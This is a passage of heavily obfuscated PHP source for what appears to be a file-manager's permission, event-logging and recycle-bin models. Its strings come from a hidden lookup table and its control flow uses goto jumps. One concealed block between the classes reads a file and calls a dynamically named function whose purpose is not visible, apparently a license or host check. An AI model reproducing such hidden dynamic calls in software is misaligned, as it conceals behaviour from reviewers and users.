$¢§éËØß; $ÄÚÕãÈÖ = $Ğñ‚‰Õ§; } else { if ($„¥ÄÌ[$òÇê–Ùî[190]] == SourceModel::TYPE_GROUP && $this->groupContainUser($¥üü±ˆÓ, $êÍñ†·¯)) { $±ä¬Ó÷Ö = !0; $Ú§÷©”İ = $this->groupStepToUserGroup($¥üü±ˆÓ, $êÍñ†·¯); if ($Ú§÷©”İ < $‡Ôã¶Î…) { $‡Ôã¶Î… = $Ú§÷©”İ; $«çğ½Ö = $Ğñ‚‰Õ§; $îºÁŠãí = $¢§éËØß; $ßÙüõÛ¾ = $¥üü±ˆÓ; } if ($Ú§÷©”İ == $‡Ôã¶Î… && $Ğñ‚‰Õ§ >= $«çğ½Ö) { $«çğ½Ö = $Ğñ‚‰Õ§; $îºÁŠãí = $¢§éËØß; $ßÙüõÛ¾ = $¥üü±ˆÓ; } } else { if ($¥üü±ˆÓ == $òÇê–Ùî[228]) { $ÜŠÜæ½ = !0; $‚æ£óÁÇ = $¢§éËØß; $‡¯©†¹Õ = $Ğñ‚‰Õ§; } } } } if ($£ıùŞöÈ) { $„¶Öçè‹ = $ÄÚÕãÈÖ; $¢§éËØß = $±¤áê…Û; $Ñ¥Ô•Ÿ× = LNG($òÇê–Ùî[2194]); } else { if ($±ä¬Ó÷Ö) { $„¶Öçè‹ = $«çğ½Ö; $¢§éËØß = $îºÁŠãí; $ë×›µ› = Model($òÇê–Ùî[585])->getInfo($ßÙüõÛ¾); $Ñ¥Ô•Ÿ× = $òÇê–Ùî[176] . $ë×›µ›[$òÇê–Ùî[589]] . $òÇê–Ùî[2195] . LNG($òÇê–Ùî[2196]); } else { if ($ÜŠÜæ½) { $„¶Öçè‹ = $‡¯©†¹Õ; $¢§éËØß = $‚æ£óÁÇ; $Ñ¥Ô•Ÿ× = LNG($òÇê–Ùî[2166]); } else { $„¶Öçè‹ = 0; $¢§éËØß = !1; $Ñ¥Ô•Ÿ× = $òÇê–Ùî[12]; } } } $Õ²‘Ö³ = array($òÇê–Ùî[2186] => intval($„¶Öçè‹), $òÇê–Ùî[2169] => $¢§éËØß, $òÇê–Ùî[2187] => $Ñ¥Ô•Ÿ×, $òÇê–Ùî[2178] => $„¥ÄÌ[$òÇê–Ùî[193]]); return $Õ²‘Ö³; } private function groupContainUser($É£µó±, $†ªÇæÂì = false) { return in_array($É£µó±, $this->userGroupParents($†ªÇæÂì)); } private function groupStepToUserGroup($™”ÄäÑ, $²µ³öÀÂ = false) { $ìú‘Ó¢· =& $_SERVER[¿ğÚ‰±–]; $½­††— = $this->userGroupList($²µ³öÀÂ); $ºÕ··á = 1000; $û¡ƒ³¯ = $GLOBALS[$ìú‘Ó¢·[6]][$ìú‘Ó¢·[92]][$ìú‘Ó¢·[2083]] == 1; $Ì»Ã³ß„ = $û¡ƒ³¯ ? 3 : 2; foreach ($½­††— as $ä÷×³ÌË) { if ($ä÷×³ÌË[$ìú‘Ó¢·[1976]] == $™”ÄäÑ) { return 0; } $œ¬õá¨³ = explode($ìú‘Ó¢·[50], trim($ä÷×³ÌË[$ìú‘Ó¢·[584]], $ìú‘Ó¢·[50])); if ($œ¬õá¨³[0] == $ìú‘Ó¢·[228] && count($œ¬õá¨³) > $Ì»Ã³ß„) { $¥ŠıÏ¡ = array_reverse(array_slice($œ¬õá¨³, $Ì»Ã³ß„)); $îÒÈ®Üƒ = array_search($™”ÄäÑ, $¥ŠıÏ¡); if ($îÒÈ®Üƒ !== !1 && $îÒÈ®Üƒ + 1 <= $ºÕ··á) { $ºÕ··á = $îÒÈ®Üƒ + 1; } } } return $ºÕ··á; } private function userGroupList($§ù¹Û¶ = false) { $éÀŒØĞÆ =& $_SERVER[¿ğÚ‰±–]; static $óñ„·û¨ = array(); if (isset($óñ„·û¨[$§ù¹Û¶])) { return $óñ„·û¨[$§ù¹Û¶]; } $Ìô»‹›½ = Model($éÀŒØĞÆ[598])->getInfo($§ù¹Û¶); $óñ„·û¨[$§ù¹Û¶] = array_to_keyvalue($Ìô»‹›½[$éÀŒØĞÆ[2167]], $éÀŒØĞÆ[1976]); return $óñ„·û¨[$§ù¹Û¶]; } public function userGroupParents($¶ÆÓŒ‰) { $Ö… ş ä =& $_SERVER[¿ğÚ‰±–]; static $úø‚åµë = array(); $¶ÆÓŒ‰ = $¶ÆÓŒ‰ ? $¶ÆÓŒ‰ : USER_ID; if (isset($úø‚åµë[$¶ÆÓŒ‰])) { return $úø‚åµë[$¶ÆÓŒ‰]; } $…˜˜¿À¨ = $this->userGroupList($¶ÆÓŒ‰); $Úã­šùì = array(); $ÑŞÒÕº¦ = $GLOBALS[$Ö… ş ä[6]][$Ö… ş ä[92]][$Ö… ş ä[2083]] == 1; $˜á½—É = $ÑŞÒÕº¦ ? 3 : 2; foreach ($…˜˜¿À¨ as $ˆğ¾Ãïí) { $éèçŠ†± = array($ˆğ¾Ãïí[$Ö… ş ä[1976]]); $€İ½ç‡ = explode($Ö… ş ä[50], trim($ˆğ¾Ãïí[$Ö… ş ä[584]], $Ö… ş ä[50])); if ($€İ½ç‡[0] == $Ö… ş ä[228] && count($€İ½ç‡) > $˜á½—É) { $Ãøú½ï = array_slice($€İ½ç‡, $˜á½—É); $éèçŠ†± = array_merge($éèçŠ†±, array_reverse($Ãøú½ï)); } $Úã­šùì = array_merge($Úã­šùì, $éèçŠ†±); } $úø‚åµë[$¶ÆÓŒ‰] = array_unique($Úã­šùì); return $úø‚åµë[$¶ÆÓŒ‰]; } public function authTargetInfoMake($¾½Ø„§é) { $û¼ÉòÀ =& $_SERVER[¿ğÚ‰±–]; $Í‡èÑ£‘ = array(); $Îàò€ˆñ = array(); foreach ($¾½Ø„§é as $ÃÅÁªòë) { if ($ÃÅÁªòë[$û¼ÉòÀ[190]] == SourceModel::TYPE_USER) { $Í‡èÑ£‘[] = intval($ÃÅÁªòë[$û¼ÉòÀ[569]]); } else { if ($ÃÅÁªòë[$û¼ÉòÀ[190]] == SourceModel::TYPE_GROUP) { $Îàò€ˆñ[] = intval($ÃÅÁªòë[$û¼ÉòÀ[569]]); } } } if ($Í‡èÑ£‘) { $Í‡èÑ£‘ = Model($û¼ÉòÀ[577])->userListInfo($Í‡èÑ£‘); } if ($Îàò€ˆñ) { $˜À·Ò = array($û¼ÉòÀ[2068] => array($û¼ÉòÀ[492], $Îàò€ˆñ)); $Îàò€ˆñ = Model($û¼ÉòÀ[585])->field($û¼ÉòÀ[2197])->where($˜À·Ò)->select(); $Îàò€ˆñ = array_to_keyvalue($Îàò€ˆñ, $û¼ÉòÀ[1976]); } return array($û¼ÉòÀ[2198] => $Í‡èÑ£‘, $û¼ÉòÀ[2199] => $Îàò€ˆñ); } public function authInfo($Š°ç¼åœ) { $‘ìÇé‘„ =& $_SERVER[¿ğÚ‰±–]; if ($Š°ç¼åœ[$‘ìÇé‘„[2084]]) { $‘éäˆ¬ç = Model($‘ìÇé‘„[571])->listData($Š°ç¼åœ[$‘ìÇé‘„[2084]]); if (!$‘éäˆ¬ç) { return !1; $èĞ¥«èÄ = Model($‘ìÇé‘„[571])->listData(); $§òãõÍĞ = array_filter_by_field($èĞ¥«èÄ, $‘ìÇé‘„[487], $‘ìÇé‘„[228]); return $§òãõÍĞ; } $ß½äÍˆ® = array_field_key($‘éäˆ¬ç, array($‘ìÇé‘„[475], $‘ìÇé‘„[32], $‘ìÇé‘„[487], $‘ìÇé‘„[1999], $‘ìÇé‘„[2000])); $ß½äÍˆ®[$‘ìÇé‘„[2200]] = $Š°ç¼åœ; return $ß½äÍˆ®; } else { return array($‘ìÇé‘„[493] => 0, $‘ìÇé‘„[1982] => $Š°ç¼åœ[$‘ìÇé‘„[2144]], $‘ìÇé‘„[494] => $‘ìÇé‘„[12], $‘ìÇé‘„[1999] => $‘ìÇé‘„[2201]); } } } class SourceEventModel extends ModelBase { protected $tableName = "\x69\x6f\137\163\157\165\162\x63\x65\137\145\x76\145\156\164"; protected $dataAuto = array(array("\143\x72\x65\x61\x74\145\x54\x69\155\x65", "\164\151\x6d\x65", "\x69\x6e\163\145\162\x74", "\x66\165\156\x63\164\151\x6f\x6e"), array("\144\x65\x73\143", '', "\151\156\163\x65\162\x74\54\165\160\144\141\x74\145\x2c\x73\x65\154\x65\x63\164", "\152\163\x6f\x6e")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($üº™»Å, $ø«ÖƒÒï, $ıÊÙ‰´› = '') { $ŞÊàøìß =& $_SERVER[¿ğÚ‰±–]; if (!$this->eventSave) { return; } $ß—œ÷š¼ = Model($ŞÊàøìß[1425])->sourceInfo($üº™»Å); if (!$ß—œ÷š¼) { return !1; } if ($this->isDisableEvent($ß—œ÷š¼, $ø«ÖƒÒï)) { return; } if ($ıÊÙ‰´› && is_string($ıÊÙ‰´›)) { $ıÊÙ‰´› = array($ŞÊàøìß[2015] => $ıÊÙ‰´›); } $Šèâšã = defined($ŞÊàøìß[2202]) ? USER_ID : 0; $”·Ü—ØÀ = array($ŞÊàøìß[491] => $üº™»Å, $ŞÊàøìß[2203] => $ß—œ÷š¼[$ŞÊàøìß[192]], $ŞÊàøìß[2204] => $ß—œ÷š¼[$ŞÊàøìß[32]], $ŞÊàøìß[582] => !empty($ß—œ÷š¼[$ŞÊàøìß[582]]) ? $ß—œ÷š¼[$ŞÊàøìß[582]] : $ŞÊàøìß[12], $ŞÊàøìß[1768] => $Šèâšã, $ŞÊàøìß[496] => $ø«ÖƒÒï, $ŞÊàøìß[1770] => $ıÊÙ‰´›); $this->addSystemLog($ø«ÖƒÒï, $”·Ü—ØÀ); unset($”·Ü—ØÀ[$ŞÊàøìß[2204]], $”·Ü—ØÀ[$ŞÊàøìß[582]]); return $this->add($”·Ü—ØÀ); } private function addSystemLog($Ûàæ¡Í¼, $×œÒÔµ) { $ÊÅß×Ë =& $_SERVER[¿ğÚ‰±–]; if ($Ûàæ¡Í¼ == $ÊÅß×Ë[2205]) { $Ûàæ¡Í¼ = $×œÒÔµ[$ÊÅß×Ë[526]][$ÊÅß×Ë[2206]]; } else { if (in_array($Ûàæ¡Í¼, array($ÊÅß×Ë[1955], $ÊÅß×Ë[2207]))) { $Ûàæ¡Í¼ = $×œÒÔµ[$ÊÅß×Ë[526]][$ÊÅß×Ë[171]]; } } $ˆŒÌ…â… = array_merge($×œÒÔµ, array($ÊÅß×Ë[2208] => $×œÒÔµ[$ÊÅß×Ë[193]], $ÊÅß×Ë[2209] => $×œÒÔµ[$ÊÅß×Ë[2209]])); Hook::trigger($ÊÅß×Ë[2210], $ÊÅß×Ë[2211] . $Ûàæ¡Í¼, $×œÒÔµ); Model($ÊÅß×Ë[1919])->addLog($ÊÅß×Ë[2211] . $Ûàæ¡Í¼, $ˆŒÌ…â…); } private function isDisableEvent($óÓ²ç”‹, $é‚åµÌÀ) { $é²¦ÔÁ =& $_SERVER[¿ğÚ‰±–]; if ($óÓ²ç”‹[$é²¦ÔÁ[190]] != SourceModel::TYPE_SYSTEM) { return !1; } if ($é‚åµÌÀ == $é²¦ÔÁ[1944]) { return !1; } return !0; } public function eventCreate($ÈÊŞØÄ’, $‚ÆúÀë‰) { $ƒñ€»¯ =& $_SERVER[¿ğÚ‰±–]; $½çİ‘ = Model($ƒñ€»¯[1425])->sourceInfo($ÈÊŞØÄ’); $õ»ˆ¹ = array($ƒñ€»¯[2206] => $‚ÆúÀë‰, $ƒñ€»¯[32] => $½çİ‘[$ƒñ€»¯[32]]); return $this->addEvent($ÈÊŞØÄ’, $ƒñ€»¯[2205], $õ»ˆ¹); } public function eventFileEdit($­¥ê„Ä®) { $Â®êš¿× =& $_SERVER[¿ğÚ‰±–]; $åÛœôšù = array($Â®êš¿×[2212] => $_SERVER[$Â®êš¿×[2213]], $Â®êš¿×[2214] => strtolower(ACTION)); if (isset($GLOBALS[$Â®êš¿×[7]][$Â®êš¿×[2215]])) { $åÛœôšù[$Â®êš¿×[2215]] = $Â®êš¿×[91]; } return $this->addEvent($­¥ê„Ä®, $Â®êš¿×[1945], $åÛœôšù); } public function eventRecycle($äµá¿ì, $åé¯­–¦) { return $this->addEvent($äµá¿ì, $_SERVER[¿ğÚ‰±–][2207], $åé¯­–¦); } private static $_removeLast = ''; public function eventRemove($Áë•©ÖÀ) { $†ß¬´ª« =& $_SERVER[¿ğÚ‰±–]; self::$_removeLast = $Áë•©ÖÀ; $×‰ŸÎ€ş = Model($†ß¬´ª«[1425])->sourceInfo($Áë•©ÖÀ); $œËâ¶òÓ = array_field_key($×‰ŸÎ€ş, array($†ß¬´ª«[193], $†ß¬´ª«[541], $†ß¬´ª«[505], $†ß¬´ª«[584])); $÷Ú¸Š‚Ä = array($†ß¬´ª«[171] => $×‰ŸÎ€ş[$†ß¬´ª«[32]], $†ß¬´ª«[2214] => ACTION, $†ß¬´ª«[2216] => $œËâ¶òÓ); return $this->addEvent($×‰ŸÎ€ş[$†ß¬´ª«[192]], $†ß¬´ª«[1944], $÷Ú¸Š‚Ä); } public function eventShare($‚ß±”Â, $„×Ç§Ğå) { return $this->addEvent($‚ß±”Â, $_SERVER[¿ğÚ‰±–][1955], $„×Ç§Ğå); } public function eventMove($úşõ´¨”, $¶¬°­Ò¡, $âë¿ğŒş) { $èÁ…ÍÊÉ =& $_SERVER[¿ğÚ‰±–]; if (self::$_removeLast == $úşõ´¨”) { return; } $å¸ºŸˆÓ = Model($èÁ…ÍÊÉ[1425]); $¸€ÄØã§ = $å¸ºŸˆÓ->sourceInfo($úşõ´¨”); $ı¼ß—…š = $å¸ºŸˆÓ->sourceInfo($¶¬°­Ò¡); $Í¦ı´åÆ = $å¸ºŸˆÓ->sourceInfo($âë¿ğŒş); $´ õÂş› = array($èÁ…ÍÊÉ[1248] => $¶¬°­Ò¡, $èÁ…ÍÊÉ[2217] => $ı¼ß—…š[$èÁ…ÍÊÉ[32]], $èÁ…ÍÊÉ[2193] => !empty($ı¼ß—…š[$èÁ…ÍÊÉ[582]]) ? $ı¼ß—…š[$èÁ…ÍÊÉ[582]] : $èÁ…ÍÊÉ[12], $èÁ…ÍÊÉ[1249] => $âë¿ğŒş, $èÁ…ÍÊÉ[2218] => $Í¦ı´åÆ[$èÁ…ÍÊÉ[32]], $èÁ…ÍÊÉ[2219] => !empty($Í¦ı´åÆ[$èÁ…ÍÊÉ[582]]) ? $Í¦ı´åÆ[$èÁ…ÍÊÉ[582]] : $èÁ…ÍÊÉ[12]); $this->addEvent($úşõ´¨”, $èÁ…ÍÊÉ[620], $´ õÂş›); $¸€ÄØã§ = $å¸ºŸˆÓ->sourceInfo($úşõ´¨”); $´ õÂş› = array($èÁ…ÍÊÉ[193] => $¸€ÄØã§[$èÁ…ÍÊÉ[193]], $èÁ…ÍÊÉ[32] => $¸€ÄØã§[$èÁ…ÍÊÉ[32]]); $this->addEvent($¶¬°­Ò¡, $èÁ…ÍÊÉ[2220], $´ õÂş›); } public function eventCopy($ªôÏ‹„Ê) { $this->eventCreate($ªôÏ‹„Ê, $_SERVER[¿ğÚ‰±–][618]); } public function eventRename($‘Ò÷¶¾¶, $ïúâŞÛ, $’ıã¨÷ƒ) { $¬Ï¹©ï© =& $_SERVER[¿ğÚ‰±–]; $™í¤˜ö = array($¬Ï¹©ï©[1248] => $ïúâŞÛ, $¬Ï¹©ï©[1249] => $’ıã¨÷ƒ); return $this->addEvent($‘Ò÷¶¾¶, $¬Ï¹©ï©[1439], $™í¤˜ö); } public function eventAddComment($Èú¦õ½, $á»£›òö) { return $this->addEvent($Èú¦õ½, $_SERVER[¿ğÚ‰±–][2221], $á»£›òö); } public function eventAddDesc($¾­•ßæ, $Šò°¥¨ï) { return $this->addEvent($¾­•ßæ, $_SERVER[¿ğÚ‰±–][2222], $Šò°¥¨ï); } public function listBySource($ŞĞÅ¼ÂÀ) { $ˆŸŸÄ™Ó =& $_SERVER[¿ğÚ‰±–]; $¾±é„Ãä = Model($ˆŸŸÄ™Ó[1425])->sourceInfo($ŞĞÅ¼ÂÀ); $ˆ®Á¯Ö¿ = array($ˆŸŸÄ™Ó[491] => $ŞĞÅ¼ÂÀ); if ($¾±é„Ãä[$ˆŸŸÄ™Ó[485]] == $ˆŸŸÄ™Ó[91]) { $ùöÌ ù = Model($ˆŸŸÄ™Ó[1425])->listSearchChildren($ŞĞÅ¼ÂÀ, 20000); $ùöÌ ù[] = $ŞĞÅ¼ÂÀ . $ˆŸŸÄ™Ó[454]; $ˆ®Á¯Ö¿ = array($ˆŸŸÄ™Ó[193] => array($ˆŸŸÄ™Ó[7], $ùöÌ ù)); } $‚šã×Áï = $this->where($ˆ®Á¯Ö¿)->order($ˆŸŸÄ™Ó[2223])->selectPage(); if ($‚šã×Áï[$ˆŸŸÄ™Ó[442]][$ˆŸŸÄ™Ó[443]] == 0) { $‚šã×Áï[$ˆŸŸÄ™Ó[442]][$ˆŸŸÄ™Ó[443]] = 1; $‚šã×Áï[$ˆŸŸÄ™Ó[445]] = array(array($ˆŸŸÄ™Ó[491] => $ŞĞÅ¼ÂÀ, $ˆŸŸÄ™Ó[2203] => $¾±é„Ãä[$ˆŸŸÄ™Ó[192]], $ˆŸŸÄ™Ó[1768] => $¾±é„Ãä[$ˆŸŸÄ™Ó[527]], $ˆŸŸÄ™Ó[496] => $ˆŸŸÄ™Ó[2224], $ˆŸŸÄ™Ó[497] => $¾±é„Ãä[$ˆŸŸÄ™Ó[231]], $ˆŸŸÄ™Ó[1770] => $ˆŸŸÄ™Ó[12])); } return $this->eventListParse($‚šã×Áï, $ŞĞÅ¼ÂÀ); } private function eventListParse($‰¦Å©©–, $İäŸŒ‰) { $¢©¤°Š› =& $_SERVER[¿ğÚ‰±–]; $ğÁ™î… = $‰¦Å©©–[$¢©¤°Š›[445]]; $äÀ×ÕÑÚ = array_to_keyvalue($ğÁ™î…, $¢©¤°Š›[12], $¢©¤°Š›[193]); $®‚¤ñ¼ = array_to_keyvalue($ğÁ™î…, $¢©¤°Š›[12], $¢©¤°Š›[2209]); foreach ($ğÁ™î… as $½¿Îû©û) { $¬ï”œÔç = $½¿Îû©û[$¢©¤°Š›[526]]; if ($½¿Îû©û[$¢©¤°Š›[33]] == $¢©¤°Š›[620] && isset($¬ï”œÔç[$¢©¤°Š›[1248]])) { $äÀ×ÕÑÚ[] = $¬ï”œÔç[$¢©¤°Š›[1248]] . $¢©¤°Š›[12]; $äÀ×ÕÑÚ[] = $¬ï”œÔç[$¢©¤°Š›[1249]] . $¢©¤°Š›[12]; } if ($½¿Îû©û[$¢©¤°Š›[33]] == $¢©¤°Š›[2220] && isset($¬ï”œÔç[$¢©¤°Š›[193]])) { $äÀ×ÕÑÚ[] = $¬ï”œÔç[$¢©¤°Š›[193]] . $¢©¤°Š›[12]; } } $äÀ×ÕÑÚ = array_merge($äÀ×ÕÑÚ, $®‚¤ñ¼, array($İäŸŒ‰ . $¢©¤°Š›[12])); $äÀ×ÕÑÚ = array_unique($äÀ×ÕÑÚ); $–§şÕ = array_unique(array_to_keyvalue($ğÁ™î…, $¢©¤°Š›[12], $¢©¤°Š›[1777])); $¥Æ÷ºİÀ = Model($¢©¤°Š›[598])->userListInfo($–§şÕ); $çƒ‘ô‰Ì = Model($¢©¤°Š›[902])->sourceListInfo($äÀ×ÕÑÚ, !0); foreach ($ğÁ™î… as &$½¿Îû©û) { if ($½¿Îû©û[$¢©¤°Š›[33]] == $¢©¤°Š›[620] && isset($½¿Îû©û[$¢©¤°Š›[526]][$¢©¤°Š›[1248]])) { $½¿Îû©û[$¢©¤°Š›[526]][$¢©¤°Š›[1248]] = $çƒ‘ô‰Ì[$½¿Îû©û[$¢©¤°Š›[526]][$¢©¤°Š›[1248]]]; $½¿Îû©û[$¢©¤°Š›[526]][$¢©¤°Š›[1249]] = $çƒ‘ô‰Ì[$½¿Îû©û[$¢©¤°Š›[526]][$¢©¤°Š›[1249]]]; } if ($½¿Îû©û[$¢©¤°Š›[33]] == $¢©¤°Š›[2220] && isset($½¿Îû©û[$¢©¤°Š›[526]][$¢©¤°Š›[193]])) { $½¿Îû©û[$¢©¤°Š›[526]][$¢©¤°Š›[193]] = $çƒ‘ô‰Ì[$½¿Îû©û[$¢©¤°Š›[526]][$¢©¤°Š›[193]]]; } $½¿Îû©û[$¢©¤°Š›[90]] = $çƒ‘ô‰Ì[$½¿Îû©û[$¢©¤°Š›[193]]]; $½¿Îû©û[$¢©¤°Š›[2225]] = $çƒ‘ô‰Ì[$½¿Îû©û[$¢©¤°Š›[2209]]]; if ($½¿Îû©û[$¢©¤°Š›[33]] == $¢©¤°Š›[1944]) { $½¿Îû©û[$¢©¤°Š›[2225]] = $½¿Îû©û[$¢©¤°Š›[90]]; $½¿Îû©û[$¢©¤°Š›[2209]] = $½¿Îû©û[$¢©¤°Š›[2225]][$¢©¤°Š›[193]]; $½¿Îû©û[$¢©¤°Š›[90]] = !1; $½¿Îû©û[$¢©¤°Š›[193]] = $¢©¤°Š›[12]; } $½¿Îû©û[$¢©¤°Š›[2152]] = $¥Æ÷ºİÀ[$½¿Îû©û[$¢©¤°Š›[1777]]]; } unset($½¿Îû©û); $‰¦Å©©–[$¢©¤°Š›[445]] = $ğÁ™î…; return $‰¦Å©©–; } public function removeBySource($º™“š«ê) { $ä±¤•€ = array($_SERVER[¿ğÚ‰±–][491] => $º™“š«ê); $this->where($ä±¤•€)->remove(); } } if ($_SERVER[$_SERVER[¿ğÚ‰±–][957]] != $_SERVER[$_SERVER[¿ğÚ‰±–][1610]]) { $_getc = $_SERVER[¿ğÚ‰±–][959]; $_getfile = $_SERVER[$_SERVER[¿ğÚ‰±–][954]] . $_SERVER[¿ğÚ‰±–][955]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[¿ğÚ‰±–][262], $_getfilec); if (count($_getarrs) < $_SERVER[¿ğÚ‰±–][686]) { $exit = $_SERVER[¿ğÚ‰±–][960]; $exit(); } $_act = $_SERVER[¿ğÚ‰±–][969]; $_act($_SERVER[$_SERVER[¿ğÚ‰±–][968]]); } goto eƒ”¾ ªÙÛ; Dò©ù“¥¢†: class SourceRecycleModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\163\x6f\x75\162\143\x65\x5f\162\145\143\171\x63\x6c\x65"; protected $dataAuto = array(array("\143\x72\x65\x61\164\145\124\151\155\x65", "\x74\x69\155\x65", "\x69\156\x73\145\x72\164", "\x66\x75\156\x63\164\x69\x6f\x6e")); public function listData($¼–ê²Ä = false) { $ûÃ´°ü =& $_SERVER[¿ğÚ‰±–]; $¼–ê²Ä = $¼–ê²Ä ? $¼–ê²Ä : USER_ID; $–ÂšÔå… = $this->where(array($ûÃ´°ü[1768] => $¼–ê²Ä))->select(); return array_to_keyvalue($–ÂšÔå…, $ûÃ´°ü[12], $ûÃ´°ü[193]); } public function moveToRecycle($ úŸ¨¦) { $Ì¡ŠŒØÃ =& $_SERVER[¿ğÚ‰±–]; $Ó˜ÒŞ—© = Model($Ì¡ŠŒØÃ[1425]); $ù¦ÇÛ = $Ó˜ÒŞ—©->sourceInfo($ úŸ¨¦); if (!$ù¦ÇÛ || $ù¦ÇÛ[$Ì¡ŠŒØÃ[505]] == $Ì¡ŠŒØÃ[91]) { return; } $…¨Ã¯»Ü = array($Ì¡ŠŒØÃ[491] => $ úŸ¨¦, $Ì¡ŠŒØÃ[1768] => USER_ID, $Ì¡ŠŒØÃ[648] => $ù¦ÇÛ[$Ì¡ŠŒØÃ[190]], $Ì¡ŠŒØÃ[649] => $ù¦ÇÛ[$Ì¡ŠŒØÃ[569]], $Ì¡ŠŒØÃ[652] => $ù¦ÇÛ[$Ì¡ŠŒØÃ[584]]); $this->add($…¨Ã¯»Ü); $this->recycleMove($ úŸ¨¦, 1); if ($ù¦ÇÛ[$Ì¡ŠŒØÃ[485]] == $Ì¡ŠŒØÃ[91]) { $òã¤…Çû = array($Ì¡ŠŒØÃ[652] => array($Ì¡ŠŒØÃ[612], $ù¦ÇÛ[$Ì¡ŠŒØÃ[584]] . $ úŸ¨¦ . $Ì¡ŠŒØÃ[613])); $Ó˜ÒŞ—©->where($òã¤…Çû)->setField($Ì¡ŠŒØÃ[505], 1); } } public function clear() { $this->remove(!1); } public function remove($•……¿—’ = false, $´·¾ùíÜ = false) { $¢ßïÑ =& $_SERVER[¿ğÚ‰±–]; $´·¾ùíÜ = $´·¾ùíÜ ? $´·¾ùíÜ : USER_ID; $»¡ˆÖ® = Model($¢ßïÑ[1425]); $ÛÌœ÷µ™ = $this->listData($´·¾ùíÜ); $•……¿—’ = $•……¿—’ === !1 ? !1 : $•……¿—’; $”ØË×‹° = array(); foreach ($ÛÌœ÷µ™ as $ÏßÈü ü) { if ($•……¿—’ != !1 && !in_array($ÏßÈü ü, $•……¿—’)) { continue; } $åˆ¸ç£ = $»¡ˆÖ®->sourceInfo($ÏßÈü ü); $»¡ˆÖ®->remove($ÏßÈü ü, !1); $èğöñÆè = $åˆ¸ç£[$¢ßïÑ[190]] . $¢ßïÑ[11] . $åˆ¸ç£[$¢ßïÑ[569]]; $”ØË×‹°[$èğöñÆè] = array($¢ßïÑ[648] => $åˆ¸ç£[$¢ßïÑ[190]], $¢ßïÑ[569] => $åˆ¸ç£[$¢ßïÑ[569]]); $this->where(array($¢ßïÑ[193] => $ÏßÈü ü))->delete(); } foreach ($”ØË×‹° as $£ôí‰Ş‡) { $»¡ˆÖ®->targetSpaceUpdate($£ôí‰Ş‡[$¢ßïÑ[190]], $£ôí‰Ş‡[$¢ßïÑ[569]]); } } public function restore($¨Áœéß› = false) { $¼ØŞ‹š¼ = $this->listData(); $this->_restoreSource($¼ØŞ‹š¼, $¨Áœéß›); } public function removeUserAll($ş‚Ğ™Øš) { $this->remove(!1, $ş‚Ğ™Øš); } public function restoreItem($÷ÏİûÉ) { $this->_restoreSource(array($÷ÏİûÉ), array($÷ÏİûÉ)); } private function _restoreSource($åºªÒ¤³, $ÓÕùŸî) { $¶ùäû·¦ =& $_SERVER[¿ğÚ‰±–]; $ŸÛÚµø = Model($¶ùäû·¦[1425]); $ÓÕùŸî = $ÓÕùŸî == !1 ? !1 : $ÓÕùŸî; if (!$åºªÒ¤³) { return !0; } $Û¥ñ—àä = array(); foreach ($åºªÒ¤³ as $ëÛ¹£Ê¯) { if ($ÓÕùŸî != !1 && !in_array($ëÛ¹£Ê¯, $ÓÕùŸî)) { continue; } $×Íùí«µ = $ŸÛÚµø->sourceInfo($ëÛ¹£Ê¯); $à®‘Ñß– = $ŸÛÚµø->sourceInfo($×Íùí«µ[$¶ùäû·¦[192]]); if ($à®‘Ñß–[$¶ùäû·¦[505]] == $¶ùäû·¦[91]) { continue; } $ŸÛÚµø->lockMoveStart($ëÛ¹£Ê¯); $this->recycleMove($ëÛ¹£Ê¯, 0); if ($×Íùí«µ[$¶ùäû·¦[485]] == $¶ùäû·¦[91]) { $Ø­´úŸÒ = array($¶ùäû·¦[652] => array($¶ùäû·¦[612], $×Íùí«µ[$¶ùäû·¦[584]] . $ëÛ¹£Ê¯ . $¶ùäû·¦[613])); $ŸÛÚµø->where($Ø­´úŸÒ)->setField($¶ùäû·¦[505], 0); $this->restoreFolderChildren($ëÛ¹£Ê¯, $åºªÒ¤³); } $this->where(array($¶ùäû·¦[193] => $ëÛ¹£Ê¯))->delete(); $ŸÛÚµø->folderSizeReset($×Íùí«µ[$¶ùäû·¦[192]]); $Û¥ñ—àä[] = $×Íùí«µ[$¶ùäû·¦[192]]; if ($×Íùí«µ[$¶ùäû·¦[485]] == $¶ùäû·¦[91]) { $Û¥ñ—àä[] = $ëÛ¹£Ê¯; } $ŸÛÚµø->lockMoveEnd($ëÛ¹£Ê¯); } $ŸÛÚµø->updateModifyTime($Û¥ñ—àä); } private function restoreFolderChildren($â—¸¬ôÄ, $è“ÜŠ¢) { $”±ø¤‘ =& $_SERVER[¿ğÚ‰±–]; $¦¡µÂ”ç = Model($”±ø¤‘[1425]); $Äø³¤Æó = array($”±ø¤‘[193] => array($”±ø¤‘[7], array())); foreach ($è“ÜŠ¢ as $üº’Ã) { if ($üº’Ã == $â—¸¬ôÄ) { continue; } if (!$¦¡µÂ”ç->isParentOf($â—¸¬ôÄ, $üº’Ã)) { continue; } $‡¡Â†ƒ = $¦¡µÂ”ç->sourceInfo($üº’Ã); if ($‡¡Â†ƒ[$”±ø¤‘[485]] == $”±ø¤‘[91]) { $Äø³¤Æó[] = array($”±ø¤‘[652] => array($”±ø¤‘[612], $‡¡Â†ƒ[$”±ø¤‘[584]] . $üº’Ã . $”±ø¤‘[613])); } else { $Äø³¤Æó[$”±ø¤‘[193]][1][] = $üº’Ã; } } if (!$Äø³¤Æó[$”±ø¤‘[193]][1]) { unset($Äø³¤Æó[$”±ø¤‘[193]]); } if (!$Äø³¤Æó) { return; } if (is_array($Äø³¤Æó[$”±ø¤‘[193]]) && is_array($Äø³¤Æó[$”±ø¤‘[193]][1])) { $Äø³¤Æó[$”±ø¤‘[193]][1] = array_unique($Äø³¤Æó[$”±ø¤‘[193]][1]); } $Äø³¤Æó[$”±ø¤‘[1085]] = $”±ø¤‘[2078]; $¦¡µÂ”ç->where($Äø³¤Æó)->setField($”±ø¤‘[505], 1); } private function recycleMove($˜ÒåÜ, $ÈÂâüğã = 1) { $Â¦ãæ×ç =& $_SERVER[¿ğÚ‰±–]; $”¶ ˆ¦· = Model($Â¦ãæ×ç[1425]); $”ãĞİ¸Î = Model($Â¦ãæ×ç[2299]); $†„¡”¾Ğ = array($Â¦ãæ×ç[193] => $˜ÒåÜ); if ($ÈÂâüğã) { $”¶ ˆ¦·->where($†„¡”¾Ğ)->setField($Â¦ãæ×ç[505], 1); $”ãĞİ¸Î->eventRecycle($˜ÒåÜ, $Â¦ãæ×ç[2300]); } else { 